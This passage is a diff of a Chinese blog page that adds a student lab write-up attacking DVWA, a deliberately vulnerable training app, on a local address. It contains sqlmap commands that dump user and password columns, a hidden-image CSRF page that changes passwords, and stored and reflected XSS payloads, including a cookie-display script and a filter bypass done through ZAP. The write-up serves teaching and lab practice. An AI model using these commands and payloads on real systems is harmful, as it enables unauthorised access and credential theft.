+<p>输出结果后部分如下：<br><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212210940332.png" alt="image-20221212210940332"></p>
+<p>可以看到成功查看到两个数据库。</p>
+<p>选择查看 dvwa 数据库中的表，输入命令：<code>python sqlmap.py -u &quot;http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=a1853oqe1rl5359v13qfs0na93&quot; --batch -D dvwa -- tables</code></p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211435853.png" alt="image-20221212211435853"></p>
+<p>可以看到查询到了数据库dvwa中的表。</p>
+<p>查看 users 表中的 columns，命令：<code>python sqlmap.py -u &quot;http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=a1853oqe1rl5359v13qfs0na93&quot; --batch -D dvwa -T users -columns</code></p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211614880.png" alt="image-20221212211614880"></p>
+<p>Dump users 表中的指定列，命令：<code>python sqlmap.py -u &quot;http://192.168.139.128/dvwa/vulnerabilities/sqli/?id=123&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=a1853oqe1rl5359v13qfs0na93&quot; --batch -D dvwa -T users -C  &quot;user,password&quot; -dump</code></p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221212211954605.png" alt="image-20221212211954605"></p>
+<h3 id="4-4-CSRF攻击"><a href="#4-4-CSRF攻击" class="headerlink" title="4.4 CSRF攻击"></a>4.4 CSRF攻击</h3><p>​		调整 DVWA 的安全等级为 low，点击 CSRF 进入攻击测试环境。右键页面，选择“view page source”，分析页面代码，可以看到表单的提交方法是“get”，如下图所示：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216154607894.png" alt="image-20221216154607894" style="zoom:67%;"> 
+
+<p>因此可以构造 URL 进行参数传递。构造如下 URL：<a target="_blank" rel="noopener" href="http://192.168.139.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.139.128/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p>
+<p>在浏览器发起对上述 URL 的请求，结果为：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216155405747.png" alt="image-20221216155405747" style="zoom: 50%;"> 
+
+<p>口令修改成功，表明存在 CSRF 的可能。</p>
+<p>编写 web 页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.139.128/dvwa/vulnerabilities/csrf/?password_new=adminx&amp;password_conf=adminx&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love 404?<span class="tag">&lt;<span class="name">h1</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>保存为 csrf-test.html，双击该文件（用同一浏览器打开），看看是否完成口令修改？</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216160531884.png" alt="image-20221216160531884" style="zoom:67%;">  
+
+<p>发现没有成功，密码没有发生修改。</p>
+<h3 id="4-5-存储型XSS攻击"><a href="#4-5-存储型XSS攻击" class="headerlink" title="4.5 存储型XSS攻击"></a>4.5 存储型XSS攻击</h3><p>将DVWA的安全等级调整为low，选择XSS stored按钮，进入如下页面：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216164905350.png" alt="image-20221216164905350" style="zoom: 50%;"> 
+
+<p>注意：如果生成了太多垃圾信息，可以通过DVWA的setup按钮，点击reset db， 则重置了数据库，删除了测试过程中注入的内容。</p>
+<p>测试是否可以注入脚本并返回浏览器运行，Name 输入框：任意输入一个名字；在Message输入框输入：<code>&lt;script&gt;alert(&quot;You are a genius!&quot;)&lt;/script&gt;</code></p>
+<p>提交之后，会弹出告警窗口，表明可以注入脚本。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165333656.png" alt="image-20221216165333656" style="zoom:67%;"> 
+
+<p>如果多次测试，所有注入的脚本每次都会全部返回给用户浏览器并执行，表明脚本是被存储了，具有持久性。也可以尝试输入：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，则会显示 cookie 信息。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165559480.png" alt="image-20221216165559480" style="zoom:67%;"> 
+
+<p>将 DVWA 的安全等级调整为medium，按照上述讨论进行注入</p>
+<p>Name输入框：mike  </p>
+<p>在Message输入框输入：  <code>&lt;script&gt;alert(&quot;I love this course!&quot;)&lt;/script&gt;</code></p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216165929296.png" alt="image-20221216165929296" style="zoom: 50%;"> 
+
+<p>然而，并没有出现想要的结果。而且显示的消息部分貌似进行了过滤。那么，如何绕过这种防御措施呢？</p>
+<p>分析源代码：</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216170022089.png" alt="image-20221216170022089" style="zoom: 67%;"> 
+
+<p>可以看到有对 name 和 message 的 sanitize（消毒）操作。但是对 name 的过滤并不严格，试试从这里进行注入？但是，前端代码的限制，不允许输入超过10个字符！！！ </p>
+<p>采用 ZAP 进行拦截，并修改 request 数据。点击设置断点按钮，按钮由绿色变为红色。然后，从浏览器发起新的请求：</p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216171632158.png" alt="image-20221216171632158"> </p>
+<p>ZAP 会拦截请求，然后手动修改”txtName&#x3D;”后面的值，也就是要注入的代码。注意这里为 了绕过对 name 输入数据的过滤，采用了大写字母开始 Script。然后点击下一步，请求会发送给服务器，服务器响应同样会被拦截，继续点击下一步，数据到达浏览器：</p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172017547.png" alt="image-20221216172017547"></p>
+<p><img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216171944644.png" alt="image-20221216171944644"> </p>
+<p>表明成功绕过了 medium 安全等级的防御措施。</p>
+<h3 id="4-6-反射型XSS攻击"><a href="#4-6-反射型XSS攻击" class="headerlink" title="4.6 反射型XSS攻击"></a>4.6 反射型XSS攻击</h3><p>调整 DVWA 的安全等级为 low，点击侧边栏中的 XSS reflected，进入环境。</p>
+<p>在输入框输入：<code>&lt;script&gt;alert(&quot;hacked!&quot;)&lt;/script&gt;</code>进行测试，看是否能够运行输入的脚本。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172331732.png" alt="image-20221216172331732" style="zoom: 50%;"> 
+
+<p>在输入框输入:<code>&lt;script&gt;window.open(&quot;https://www.baidu.com&quot;)&lt;/script&gt;</code> 进行测试，看是否能够运行输入的脚本。</p>
+<img src="/2022/12/08/web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/image-20221216172500534.png" alt="image-20221216172500534" style="zoom: 50%;"> 
+
+<p>运行成功。</p>
+<p>至此，命令注入、SQL 注入、XSS、CSRF 等漏洞利用实验基本完成。</p>
+
     
 
     
@@ -319,6 +541,26 @@
       		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CSRF</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SQL注入</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">命令注入</a>
         		</li>
       		
 		</ul>
@@ -389,6 +631,15 @@
 
 <nav id="article-nav">
   
+    <a href="/2022/12/19/library-import/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          library-import
+        
+      </div>
+    </a>
+  
   
     <a href="/2022/12/06/BOF/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">缓冲区溢出攻击实验</div>
@@ -410,6 +661,19 @@
             </div>
         </div>
         
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">一、实验目的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E9%AA%8C%E5%86%85%E5%AE%B9"><span class="toc-number">2.</span> <span class="toc-text">二、实验内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">三、实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-XSS%E6%94%BB%E5%87%BB"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 XSS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">四、实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 命令注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 SQL注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 CSRF攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 存储型XSS攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.6.</span> <span class="toc-text">4.6 反射型XSS攻击</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
         
     </div>
 </aside>
@@ -533,6 +797,10 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">网络安全</a>
               </li>
              
@@ -549,11 +817,59 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">neo4j</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">pandas</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">csv</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">博客后端</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">springboot</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Mybatisplus</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">shiro</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">jwt</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CSRF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">命令注入</a>
               </li>
             
             <div class="clearfix"></div>
